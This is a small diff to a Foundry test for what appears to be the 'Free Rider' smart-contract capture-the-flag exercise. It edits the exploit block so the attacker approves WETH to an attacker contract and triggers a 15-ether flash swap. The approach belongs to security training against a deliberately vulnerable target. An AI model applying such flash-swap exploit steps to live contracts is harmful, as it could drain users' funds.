@@ -162,7 +162,8 @@ contract FreeRider is Test {
         );
         vm.startPrank(attacker, attacker);
         weth.deposit{value: 0.5 ether}();
-        attackerContract.flashSwap(UNISWAP_INITIAL_WETH_RESERVE - 10 ether);
+        weth.approve(address(attackerContract), type(uint256).max);
+        attackerContract.flashSwap(15 ether);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
